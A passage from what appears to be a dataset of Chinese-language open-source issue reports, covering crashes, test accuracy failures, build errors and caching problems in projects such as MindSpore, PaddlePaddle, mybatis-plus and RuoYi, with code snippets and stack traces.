<code>: fact.forward_dynamic_shape_cmp() def real_run_op(self, *args): """""" Run single op. Args: args (tuple): Op prim and input arguments. Return: Tensor, result of run op. """""" return self._executor.real_run_op(*args)"
console.input() 输入字符串不全,JDK版本： openjdk_8_201 hutool版本： 5.5.7   <code>: String cmd = Console.input(); Console.print(cmd); arp dsd arp
Cannot resolve plugin org.springframework.boot:spring-boot-maven-plugin:<unknown>,新建子模块时，根据官方文档报错 Cannot resolve plugin org.springframework.boot:spring-boot-maven-plugin: apache-maven-3.6.3 idea 2020.3   <code>: &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;
cuDNN batch norm operator needs to update to use cuDNN helper functions.,"The cuDNN batch norm operator uses the cuDNN API directly, for example using and directly. But we have some cuDNN helper functions to create and destroy the cuDNN descriptor conveniently. These cuDNN helper functions had been used in cuDNN convolution operators.   <code>: platform::dynload::cudnnCreateTensorDescriptor platform::dynload::cudnnDestroyTensorDescriptor"
PHP Fatal error:  Cannot redeclare show_credit(),未登录状态下访问 报错   <code>: home.php?mod=space&amp;uid=3&amp;do=index PHP Fatal error: Cannot redeclare show_credit() (previously declared in /var/www/discuz.com/source/include/space/space_index.php:143) in /var/www/discuz.com/source/include/space/space_profile.php on line 197
"调用capi时报错Can't parse message of type ""paddle.TrainerConfig""","模型训练使用的是线性回归的例子http://paddlepaddle.org/docs/develop/documentation/zh/getstarted/concepts/use_concepts_cn.html 训练完使用merge_model.py把训练出来的模型和网络配置合并，代码如下： 调用capi时使用paddle_gradient_machine_create_for_inference_with_parameters直接读取模型和配置合并之后的文件（merge_model），调试发现，调用该函数时出错，报错为：   <code>: import paddle.v2 as paddle from paddle.utils.merge_model import merge_v2_model def network(is_infer=False): x = paddle.layer.data(name='x', type=paddle.data_type.dense_vector(2)) y_predict = paddle.layer.fc(input=x, size=1, act=paddle.activation.Linear()) if is_infer: return y_predict else: y = paddle.layer.data(name='y', type=paddle.data_type.dense_vector(1)) return paddle.layer.square_error_cost(input=y_predict, label=y) net = network(is_infer=True) param_file = ""merge_model/models.tar.gz"" output_file = ""merge_model/merge_model"" merge_v2_model(net, param_file, output_file) I0129 03:04:59.893679 18593 Util.cpp:166] commandline: --use_gpu=False filename:models/merge_model size:317 [libprotobuf ERROR /home/work/wangdishuai/capi/Paddle/third_party/protobuf/src/extern_protobuf/src/google/protobuf/message_lite.cc:119] Can't parse message of type ""paddle.TrainerConfig"" because it is missing required fields: opt_config [libprotobuf ERROR /home/work/wangdishuai/capi/Paddle/third_party/protobuf/src/extern_protobuf/src/google/protobuf/message_lite.cc:119] Can't parse message of type ""paddle.ModelConfig"" because it is missing required fields: type *** Aborted at 1517195099 (unix time) try ""date -d @1517195099"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGSEGV (@0x0) received by PID 18592 (TID 0x7f603f8f4700) from PID 0; stack trace: *** @ 0x7f603f4d2390 (unknown) @ 0x7f5f611e9a81 paddle_gradient_machine_forward @ 0x7f5f62fe93ff (unknown) Segmentation fault"
缓存问题,单表场景 在网络不稳的情况下导致单表更新或新增失败，即使之后重新操作并操作成功，分页查询能够看到在数据库中没有的数据，譬如说连续点击分页查询按钮十次，查询条件完全相同，十次中有一次返回错误的数据，这条数据是数据库中没有的旧数据，怀疑是被mybatis-plus缓存 设置了CacheEnabled为false也依然有缓存的现象存在 不知可否通过mybatis-plus关闭所有缓存，不想让mapper来控制缓存   <code>: MybatisConfiguration mc = new MybatisConfiguration(); // 对于完全自定义的mapper需要加此项配置，才能实现下划线转驼峰 mc.setMapUnderscoreToCamelCase(true); mc.setDefaultScriptingLanguage(MybatisXMLLanguageDriver.class); mc.setCacheEnabled(false); mybatisPlus.setConfiguration(mc);
[CT][MS][GridSampler2D] The testcase of GridSampler2D has accuracy error occasionally.,"The testcase of GridSampler2D has accuracy error The testcase of GridSampler2D has accuracy error / 硬件环境: /device ascend/CPU/ : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph Pynative\GRAPH + CPU\D都偶现： test_gridsampler_nearest_zeros_false_float16: CPU Pynative\GRAPH模式会偶现： test_gridsampler_nearest_zeros_true_float32 ： pytest test_gridsampler2d.py::test_gridsampler_nearest_zeros_false_float16 --count 50 pytest test_gridsampler2d.py::test_gridsampler_nearest_zeros_true_float32 --count 50 run pass and no error CPU上偶现概率比较低，可能需要多跑几次   <code>: def test_gridsampler_nearest_zeros_false_float16(): input_list = [] input_list.append(Tensor(np.random.randn(25, 6, 3, 4).astype(np.float16))) input_list.append(Tensor(np.random.randn(25, 8, 5, 2).astype(np.float16))) fact = GridSampler2DMock(attributes={'interpolation_mode': 'nearest', 'padding_mode': 'zeros', 'align_corners': False}, inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_gridsampler_nearest_zeros_true_float32(): input_list = [] input_list.append(Tensor(np.random.randn(8, 45, 73, 25).astype(np.float32))) input_list.append(Tensor(np.random.randn(8, 27, 83, 2).astype(np.float32))) fact = GridSampler2DMock(attributes={'interpolation_mode': 'nearest', 'padding_mode': 'zeros', 'align_corners': True}, inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_gridsampler_nearest_zeros_false_float16(): input_list = [] input_list.append(Tensor(np.random.randn(25, 6, 3, 4).astype(np.float16))) input_list.append(Tensor(np.random.randn(25, 8, 5, 2).astype(np.float16))) fact = GridSampler2DMock(attributes={'interpolation_mode': 'nearest', 'padding_mode': 'zeros', 'align_corners': False}, inputs=input_list) &gt; fact.forward_cmp() test_gridsampler2d.py:220: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/gridsampler2d_ops.py:96: in forward_cmp allclose_nparray(out_torch, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[ 0. , 0. , 2.229 , 0. , 0. ], [ 0. , 0.576 , 1.417 , 0. ...65 , 0. , 0. ], [ 0. , 0. , 0. , 0. , -0.8384 ]]]], dtype=float16) data_me = array([[[[ 0. , 0. , 2.229 , 0. , 0. ], [ 0. , 0.576 , 1.417 , 0. ...65 , 0. , 0. ], [ 0. , 0. , 0. , 0. , -0.8384 ]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 0.1175 -1.536 -0.4868 -0.989 -1.373 -0.3567] E data_me_error:[0. 0. 0. 0. 0. 0.] E loss:[0.1175 1.536 0.4868 0.989 1.373 0.3567] def test_gridsampler_nearest_zeros_true_float32(): input_list = [] input_list.append(Tensor(np.random.randn(8, 45, 73, 25).astype(np.float32))) input_list.append(Tensor(np.random.randn(8, 27, 83, 2).astype(np.float32))) fact = GridSampler2DMock(attributes={'interpolation_mode': 'nearest', 'padding_mode': 'zeros', 'align_corners': True}, inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_gridsampler2d.py:251: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/gridsampler2d_ops.py:102: in grad_cmp allclose_nparray(input_grad_torch[index], input_grad_mindspore[index], self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[0. , 0.01322744, 0. , ..., 0. , 0. , 0. ], [0. ...3], [0.01747355, 0. , 0.02095137, ..., 0. , 0. , 0. ]]]], dtype=float32) data_me = array([[[[0. , 0.01322744, 0. , ..., 0. , 0. , 0. ], [0. ...3], [0.01747355, 0. , 0.02095137, ..., 0. , 0. , 0. ]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0.01766678 0.01043339 0.02228286 0.01789657 0.02190805 0.01870431 E 0.01010214 0.01013522 0.02707515 0.02527813 0.02593128 0.02109253 E 0.02718086 0.02013629 0.01871102 0.01322625 0.01995086 0.01234731 E 0.02283109 0.02490718 0.01519498 0.01786521 0.01343472 0.01108529 E 0.01338984 0.02677085 0.0209712 0.02328829 0.01750755 0.02888311 E 0.02711264 0.01097307 0.02126043 0.02821431 0.01222253 0.02281754 E 0.0126097 0.02753194 0.0158223 0.02797332 0.0173244 0.02235102 E 0.01182112 0.01301461 0.01431946 0.01728065 0.02660914 0.01322828 E 0.01722295 0.01271691 0.016178 0.02779588 0.02432641 0.02761433 E 0.02787225 0.02210985 0.02391648 0.02104503 0.01043456 0.01744917 E 0.01619769 0.02748938 0.02638398 0.02657722 0.01727261 0.02688785 E 0.02022754 0.01874226 0.02991625 0.01543098 0.01767057 0.02030852 E 0.01047384 0.02561621 0.02698589 0.01682517 0.0286942 0.01633441 E 0.02756708 0.01827691 0.01653575 0.02606214 0.01965401 0.02901452 E 0.02955075 0.02190112 0.02892496 0.01860243 0.01389832 0.01790402] E data_me_error:[0. 0.02810016 0. 0.04017942 0. 0.04061236 E 0. 0.02023736 0. 0.05235329 0. 0.04702382 E 0. 0.04731715 0. 0.03193727 0. 0.03229817 E 0. 0.04773827 0. 0.03306019 0. 0.02452001 E 0. 0.04016068 0. 0.04425948 0. 0.04639065 E 0. 0.03808571 0. 0.04947475 0. 0.03504008 E 0. 0.04014164 0. 0.04379562 0. 0.03967541 E 0. 0.02483573 0. 0.03160012 0. 0.03983741 E 0. 0.02993986 0. 0.04397388 0. 0.05194075 E 0. 0.04998209 0. 0.0449615 0. 0.02788373 E 0. 0.04368707 0. 0.0529612 0. 0.04416046 E 0. 0.0389698 0. 0.04534723 0. 0.03797909 E 0. 0.03609005 0. 0.04381105 0. 0.04502861 E 0. 0.04584399 0. 0.04259788 0. 0.04866853 E 0. 0.05145187 0. 0.04752739 0. 0.03180234] E loss:[0.01766678 0.01766678 0.02228286 0.02228286 0.02190805 0.02190805 E 0.01010214 0.01010214 0.02707515 0.02707515 0.02593128 0.02593128 E 0.02718086 0.02718086 0.01871102 0.01871102 0.01995086 0.01995086 E 0.02283109 0.02283109 0.01519498 0.01519498 0.01343472 0.01343472 E 0.01338984 0.01338984 0.0209712 0.0209712 0.01750755 0.01750755 E 0.02711264 0.02711264 0.02126043 0.02126043 0.01222253 0.01222253 E 0.0126097 0.0126097 0.0158223 0.01582229 0.0173244 0.01732439 E 0.01182112 0.01182112 0.01431946 0.01431946 0.02660914 0.02660914 E 0.01722295 0.01722295 0.016178 0.016178 0.02432641 0.02432641 E 0.02787225 0.02787225 0.02391648 0.02391648 0.01043456 0.01043456 E 0.01619769 0.01619769 0.02638398 0.02638398 0.01727261 0.01727262 E 0.02022754 0.02022754 0.02991625 0.02991626 0.01767057 0.01767057 E 0.01047384 0.01047384 0.02698589 0.02698589 0.0286942 0.0286942 E 0.02756708 0.02756708 0.01653575 0.01653575 0.01965401 0.01965401 E 0.02955075 0.02955075 0.02892496 0.02892496 0.01389832 0.01389832]"
升级 mysql 8.0.20,环境信息 pigx版本: 3.9.0 是否修改包名: 否 升级mysql 8.0.20 驱动包 升级至 8.0.20 dockerfile 升级至 8.0.20   <code>: &lt;mysql.connector.version&gt;8.0.20&lt;/mysql.connector.version&gt;
v2版本factorization_machine使用sparse更新出错,"您好！我在使用factorization_machine时，input layer是sparse_binary_data格式，如果factorization_machine的sparse_update设置为false，可以正常更新，但如果设置为true，则会失败。代码如下，帮忙看下哈～ 报错信息如下： Thread [140249778378496] Forwarding factorization_machine_0, *** Aborted at 1552551298 (unix time) try ""date -d @1552551298"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGSEGV (@0x0) received by PID 11716 (TID 0x7f8e72385700) from PID 0; stack trace: *** Segmentation fault (core dumped)   <code>: def fm_layer(self, input_data, factor_size, fm_param_attr=None): first_order = paddle.layer.fc(input=input_data, size=1, act=paddle.activation.Linear(), param_attr=paddle.attr.ParameterAttribute(sparse_update=True)) second_order = paddle.layer.factorization_machine( input=input_data, factor_size=factor_size, act=paddle.activation.Linear(), param_attr=paddle.attr.ParameterAttribute(**sparse_update=True**)) out = paddle.layer.addto( input=[first_order, second_order], act=paddle.activation.Linear(), bias_attr=False) return out @ 0x318b20f500 (unknown) @ 0x7f8e418b68bb paddle::BaseMatrixT&lt;&gt;::applyTernary&lt;&gt;() @ 0x7f8e418b7288 paddle::BaseMatrixT&lt;&gt;::addRowScale() @ 0x7f8e416ba284 paddle::FactorizationMachineLayer::backward() @ 0x7f8e417d65b2 paddle::NeuralNetwork::backward() @ 0x7f8e417f87c2 paddle::TrainerThread::backward() @ 0x7f8e417f894d paddle::TrainerThread::computeThread() @ 0x318eab6470 (unknown) @ 0x318b207851 (unknown) @ 0x318aee767d (unknown) @ 0x0 (unknown)"
[CI][MS][doc] MirrorPad Sample Problems in the CPU Environment,": CPU /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : https://www.mindspore.cn/docs/api/en/master/api_python/ops/mindspore.ops.MirrorPad.html?highlight=mirrorpad#mindspore.ops.MirrorPad 在CPU后端直接执行MirrorPad测试样例，出现Segmentation fault (core dumped) 在GPU后端直接执行MirrorPad测试样例，可以正常显示结果 在Ascend后端直接执行MirrorPad测试样例，可以正常显示结果 新建test.py文件，将测试样例拷贝进去，在CPU机器，执行 python test.py 出现Segmentation fault (core dumped) 测试样例在CPU机器上，可以正常通过   <code>: # case1: mode=""REFLECT"" class Net(nn.Cell): def __init__(self, mode): super(Net, self).__init__() self.pad = ops.MirrorPad(mode=mode) self.paddings = Tensor([[1, 1], [2, 2]]) def construct(self, input_x): return self.pad(input_x, self.paddings) input_x = Tensor([[1,2,3], [4,5,6], [7,8,9]]) pad = Net(""REFLECT"") output = pad(input_x) print(output) # case2: mode=""SYMMETRIC"" pad = Net(""SYMMETRIC"") output = pad(input_x) print(output) [WARNING] DEBUG(3309,7f8c2383d740,python):2021-12-06-16:41:30.469.956 [mindspore/ccsrc/debug/debugger/debugger.cc:94] Debugger] Not enabling debugger. Debugger does not support CPU. Segmentation fault (core dumped)"
实体监听IEntityChangedListener 的 严重问题 3： 监听中的监听不会执行,"Furion 版本号 2.18.7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 当我在A实体的监听事件OnChanging中 调用增删改B实体的方法，并在该方法中执行 _rep.Insert()或 _rep.Update 时，执行完毕后，数据保存成功了，但并没有执行B实体的监听事件OnChanging 【我也受益于ABP框架。难道Furion框架的实体监听的逻辑与abp不一样？】 无 public class SysOrgListener1 : IEntityChangedListener { public class SysOrgManager:ITransient { private readonly IRepository _rep; private readonly IRepository _userRep; public SysOrgManager(IRepository rep,IRepository userRep) { _rep = rep; _userRep=userRep; } public void OnChanging(SysOrg entity, EntityState state) { _userRep.Insert(new SysUser { Name = ""名称"" }); } } Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 能够监听B实体事件 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: public void OnChanging(SysOrg entity, DbContext dbContext, Type dbContextLocator, EntityState state) { App.GetService&lt;SysOrgManager&gt;().OnChanging(entity, state); } public void OnChanged(SysOrg newEntity, SysOrg oldEntity, DbContext dbContext, Type dbContextLocator, EntityState state) { App.GetService&lt;SysOrgManager&gt;().OnChanged(newEntity, oldEntity, state); } }"
导出EXCEL文件报错The maximum number of Cell Styles was exceeded,导出文件时，报错，数据仅7000条左右，请问如何解决，感谢   <code>: java.lang.IllegalStateException: The maximum number of Cell Styles was exceeded. You can define up to 64000 style in a .xlsx Workbook at org.apache.poi.xssf.model.StylesTable.createCellStyle(StylesTable.java:831) at org.apache.poi.xssf.usermodel.XSSFWorkbook.createCellStyle(XSSFWorkbook.java:754) at org.apache.poi.xssf.streaming.SXSSFWorkbook.createCellStyle(SXSSFWorkbook.java:884) at com.ruoyi.common.utils.poi.ExcelUtil.setDataCell(ExcelUtil.java:851) at com.ruoyi.common.utils.poi.ExcelUtil.addCell(ExcelUtil.java:800) at com.ruoyi.common.utils.poi.ExcelUtil.fillExcelData(ExcelUtil.java:614) at com.ruoyi.common.utils.poi.ExcelUtil.writeSheet(ExcelUtil.java:588) at com.ruoyi.common.utils.poi.ExcelUtil.exportExcel(ExcelUtil.java:548) at com.ruoyi.common.utils.poi.ExcelUtil.exportExcel(ExcelUtil.java:433) at com.ruoyi.common.utils.poi.ExcelUtil.exportExcel(ExcelUtil.java:419) at com.ruoyi.web.controller.system.WpGeneSynthesisOrderController.export(WpGeneSynthesisOrderController.java:645) at com.ruoyi.web.controller.system.WpGeneSynthesisOrderController$$FastClassBySpringCGLIB$$a90dbdea.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:783) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.aspectj.AspectJAfterThrowingAdvice.invoke(AspectJAfterThrowingAdvice.java:64) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor.invoke(AfterReturningAdviceInterceptor.java:57) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor$1.proceed(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:82) at org.apache.shiro.authz.aop.AuthorizingMethodInterceptor.invoke(AuthorizingMethodInterceptor.java:39) at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor.invoke(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:115) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698) at com.ruoyi.web.controller.system.WpGeneSynthesisOrderController$$EnhancerBySpringCGLIB$$e2557a51.export(&lt;generated&gt;) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.lang.reflect.Method.invoke(Method.java:566) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at com.ruoyi.common.xss.XssFilter.doFilter(XssFilter.java:54) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:360) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:399) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:889) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1743) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.base/java.lang.Thread.run(Thread.java:834)
【GDB dwarf】macro  不支持,"maplec GCC 编译命令 结果   <code>: #include &lt;stdio.h&gt; int main() { return 0; } (gdb) list main 1 #include &lt;stdio.h&gt; 2 3 int main() { 4 return 0; 5 } (gdb) info source Current source file is xx/AST0121-Macro/Macro.c Compilation directory is /usr/include/bits Located in xx/AST0121-Macro/Macro.c Contains 5 lines. Source language is c. Producer is Maple Version 1.0.0. Compiled with DWARF 2 debugging format. Does not include preprocessor macro info. &lt;===== 与GCC的不一致 (gdb) info macro WHERE The symbol `WHERE' has no definition as a C/C++ preprocessor macro at &lt;user-defined&gt;:-1 &lt;===== 与GCC的不一致 (gdb) info macro __FILE__ The symbol `__FILE__' has no definition as a C/C++ preprocessor macro at &lt;user-defined&gt;:-1 &lt;===== 与GCC的不一致 gcc -g3 Macro.c -o Macro_gcc (gdb) list main 1 #include &lt;stdio.h&gt; 2 3 int main() { 4 return 0; 5 } (gdb) info source Current source file is Macro.c Compilation directory is xx/AST0121-Macro Located in xx/AST0121-Macro/Macro.c Contains 5 lines. Source language is c. Producer is GNU C17 9.4.0 -mlittle-endian -mabi=lp64 -g3 -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection. Compiled with DWARF 2 debugging format. 